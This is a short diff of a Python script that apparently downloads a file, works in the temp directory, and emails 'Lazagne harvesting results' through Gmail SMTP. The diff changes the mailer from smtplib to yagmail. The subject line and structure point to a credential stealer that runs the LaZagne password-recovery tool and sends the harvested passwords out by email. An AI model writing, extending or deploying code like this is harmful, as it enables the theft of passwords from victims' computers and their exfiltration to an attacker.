@@ -2,7 +2,7 @@
 
 import requests
 import subprocess
-import smtplib
+import yagmail
 import os
 import tempfile
 
@@ -14,12 +14,10 @@ def download(url):
         file.write(get_response.content)
 
 
-def send_mail(email, password, message):
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(email, password)
-    server.sendmail(email, email, message)
-    server.quit()
+def send_mail(email, password, content):
+    topic = "Lazagne harvesting results"
+    yag = yagmail.SMTP(email, password)
+    yag.send(email, topic, content)
 
 
 os.chdir(tempfile.gettempdir())
